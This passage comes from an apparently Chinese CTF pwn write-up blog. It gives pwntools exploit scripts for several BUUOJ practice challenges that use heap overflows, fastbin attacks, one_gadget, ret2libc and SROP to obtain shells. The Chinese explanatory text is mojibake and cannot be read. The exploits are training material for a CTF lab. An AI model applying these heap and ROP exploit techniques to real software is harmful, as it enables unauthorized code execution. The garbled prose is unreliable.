<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27143</span>)<span class="comment">#process(&#x27;./babyheap_0ctf_2017&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index:<span class="built_in">int</span>,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line">    </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#idx1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1, the former idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2, the former idx4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx5, prevent the top chunk combine it</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into unsorted bin, fd points to the main_arena</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into fastbin</span></span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload) <span class="comment">#overwrite fd to fake chunk addr</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx6, our fake chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/10/19/kJSyCIWmsLdoaOD.png" alt="image.png"></p>
<h2 id="0x043-wustctf2020-closed-LinuxåŸºç¡€çŸ¥è¯†"><a href="#0x043-wustctf2020-closed-LinuxåŸºç¡€çŸ¥è¯†" class="headerlink" title="0x043.wustctf2020_closed - LinuxåŸºç¡€çŸ¥è¯†"></a>0x043.wustctf2020_closed - LinuxåŸºç¡€çŸ¥è¯†</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œåªå¼€äº† NX</p>
<p><img src="https://i.loli.net/2021/04/06/vx5cUdqXPCj6NZS.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ç›´æ¥ç»™ shellï¼Œä½†æ˜¯å…³äº† stdout å’Œ stderr</p>
<p><img src="https://i.loli.net/2021/04/06/2uzkPFVlrtob9MO.png" alt="image.png"></p>
<p>ç”¨ <code>1&gt;&amp;0</code> å³å¯æ‹¿åˆ°è¾“å‡º</p>
<p><img src="https://i.loli.net/2021/04/06/S6efsWGY9mcKZhL.png" alt="image.png"></p>
<h2 id="0x044-ciscn-2019-es-7-ret2libc-SROP"><a href="#0x044-ciscn-2019-es-7-ret2libc-SROP" class="headerlink" title="0x044.ciscn_2019_es_7 - ret2libc | SROP"></a>0x044.ciscn_2019_es_7 - ret2libc | SROP</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œåªå¼€äº† NX</p>
<p><img src="https://i.loli.net/2021/04/06/zhqX5PnrtVT9AHp.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/04/06/rqQVaZCRAn5feOW.png" alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥è€ƒè™‘è®¾ç½®è¿”å›åˆ° vulnå¼€å¤´() è¿›è¡Œå¤šæ¬¡è¯»</p>
<p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯vuln()å‡½æ•°ä»¥ebpä½œä¸ºè¿”å›å€¼</p>
<p><img src="https://i.loli.net/2021/04/06/3A8dfRBr2KTOk7o.png" alt="image.png"></p>
<h3 id="è§£æ³•ä¸€ï¼šret2libc"><a href="#è§£æ³•ä¸€ï¼šret2libc" class="headerlink" title="è§£æ³•ä¸€ï¼šret2libc"></a>è§£æ³•ä¸€ï¼šret2libc</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¤šæ¬¡è¿”å›åˆ° vuln() å¼€å¤´ç‰¹å®šåç§»å¤„ï¼Œå°†æ ˆä¸€æ­¥æ­¥æ‹‰è¿‘åˆ° main çš„è¿”å›åœ°å€é™„è¿‘ï¼Œé€šè¿‡æ‰“å°åŠŸèƒ½æ‰“å°å‡º main çš„è¿”å›åœ°å€ï¼Œæ³„éœ² libc åŸºå€ï¼Œä¹‹åå°±æ˜¯ ret2libc ä¸€å¥—å¸¦èµ°</p>
<p>æ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26477</span>)<span class="comment">#process(&#x27;./ciscn_2019_es_7&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>) <span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_es_7&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x10</span></span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">ret = e.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line">leave_ret = e.search(asm(<span class="string">&#x27;leave ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0x4004F1</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;B&#x27;</span> * offset + p64(<span class="number">0x4004F1</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;C&#x27;</span> * offset + p64(<span class="number">0x4004F1</span>))</span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;libc addr leak: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc_base = (libc_leak - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * offset + p64(ret) + p64(pop_rdi_ret) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/06/zwuEUijrNJvpPhF.png" alt="image.png"></p>
<h3 id="è§£æ³•äºŒï¼šSROP"><a href="#è§£æ³•äºŒï¼šSROP" class="headerlink" title="è§£æ³•äºŒï¼šSROP"></a>è§£æ³•äºŒï¼šSROP</h3><p>è§‚å¯Ÿåˆ°ç¨‹åºä¸­å­˜åœ¨å¦‚ä¸‹ gadgetï¼š</p>
<p><img src="https://i.loli.net/2021/04/06/fpWZlRjIcLrDTN8.png" alt="image.png"></p>
<p>å¯ä»¥è€ƒè™‘ç¬¬ä¸€æ¬¡è¾“å…¥æ—¶æ³„éœ²æ ˆä¸Šåœ°å€ï¼Œç¬¬äºŒæ¬¡è¾“å…¥é€šè¿‡ SROP æ‹¿ shell</p>
<p>æ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29375</span>)<span class="comment">#process(&#x27;./ciscn_2019_es_7&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>) <span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_es_7&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x10</span></span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">ret = e.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line">leave_ret = e.search(asm(<span class="string">&#x27;leave ; ret&#x27;</span>)).__next__()</span><br><span class="line">mov_rax_15 = e.search(asm(<span class="string">&#x27;mov rax , 0xf ; ret&#x27;</span>)).__next__()</span><br><span class="line">syscall_addr = e.search(asm(<span class="string">&#x27;syscall&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * offset + p64(e.sym[<span class="string">&#x27;vuln&#x27;</span>]))</span><br><span class="line">stack_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;stack leak: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line">buf_addr = stack_leak - <span class="number">0x118</span></span><br><span class="line">log.success(<span class="string">&#x27;buf addr now: &#x27;</span> + <span class="built_in">hex</span>(buf_addr))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span> <span class="comment"># syscall::execve, constants.SYS_execve is also ok</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">frame.rdi = buf_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(offset, <span class="string">b&#x27;\x00&#x27;</span>) + p64(mov_rax_15) + p64(syscall_addr) + <span class="built_in">bytes</span>(frame))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/06/Sz148MWw2GbLoce.png" alt="image.png"></p>
<blockquote>
<p>è¿œç¨‹çš„æ ˆå’Œæœ¬åœ°çš„æ ˆå¥½åƒè¿˜ä¸å¤§ä¸€æ ·â€¦æœ€å¥½é€‰æ‹©ç›¸åŒç‰ˆæœ¬çš„ç³»ç»Ÿè¿›è¡Œè°ƒè¯•</p>
</blockquote>
<h2 id="0x045-jarvisoj-level5-ret2csu-ret2libc"><a href="#0x045-jarvisoj-level5-ret2csu-ret2libc" class="headerlink" title="0x045.jarvisoj_level5 - ret2csu + ret2libc"></a>0x045.jarvisoj_level5 - ret2csu + ret2libc</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œåªå¼€äº† NX</p>
<p><img src="https://i.loli.net/2021/04/06/R4TLerujoW2yn1U.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/04/06/J2BYlvZwmiDtspx.png" alt="image.png"></p>
<p>å¥—æ¿å­ ret2libc å³å¯</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26872</span>)<span class="comment">#process(&#x27;./level3_x64&#x27;) # </span></span><br><span class="line">e=  ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rsi_r15_ret = e.search(asm(<span class="string">&#x27;pop rsi ; pop r15 ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>* offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rsi_r15_ret) + p64(e.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>* offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/06/zM7Ky1pP2WFlsLq.png" alt="image.png"></p>
<h2 id="0x046-hitcontraining-bamboobox-Heap-Overflow-Fastbin-Attack-one-gadget-Unlink-House-of-Force"><a href="#0x046-hitcontraining-bamboobox-Heap-Overflow-Fastbin-Attack-one-gadget-Unlink-House-of-Force" class="headerlink" title="0x046.hitcontraining_bamboobox - Heap Overflow + Fastbin Attack + one_gadget | Unlink | House of Force"></a>0x046.hitcontraining_bamboobox - Heap Overflow + Fastbin Attack + one_gadget | Unlink | House of Force</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨â€¦åªå¼€äº† NX å’Œ canary</p>
<p><img src="https://i.loli.net/2021/04/06/u1tz4knpvFIU6YE.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>å¤§æ¦‚æ˜¯ä¸€é“æœ‰ç€åˆ†é…ã€é‡Šæ”¾ã€ç¼–è¾‘ã€æ‰“å°å †å—åŠŸèƒ½çš„å †é¢˜</p>
<p> æ¼æ´ç‚¹åœ¨äºç¼–è¾‘æ—¶æœªå¯¹é•¿åº¦è¿›è¡Œæ£€æŸ¥ï¼Œå­˜åœ¨<strong>å †æº¢å‡º</strong></p>
<p><img src="https://i.loli.net/2021/04/06/sQWAijDXVY5zZH1.png" alt="image.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯æ— è®ºæ˜¯åˆ›å»ºå †å—è¿˜æ˜¯ç¼–è¾‘å †å—éƒ½æœ‰ä¸€ä¸ª <code>&#39;\0&#39;</code> æˆªæ–­</p>
<h3 id="è§£æ³•ä¸€ï¼šFastbin-Attack-one-gadget"><a href="#è§£æ³•ä¸€ï¼šFastbin-Attack-one-gadget" class="headerlink" title="è§£æ³•ä¸€ï¼šFastbin Attack + one_gadget"></a>è§£æ³•ä¸€ï¼šFastbin Attack + one_gadget</h3><p>åŸºæœ¬ä¸Šæ˜¯å¥—æ¿å­åšé¢˜ï¼Œç®—æ˜¯å †é¢˜çš„é€šæ³•äº†ï¼Œreallocè°ƒæ ˆï¼Œæ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29469</span>)<span class="comment">#process(&#x27;./bamboobox&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x40</span>, p64(<span class="number">0x21</span>) * <span class="number">6</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 5</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 3, overlappnig with idx 2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba5&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    dump()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span 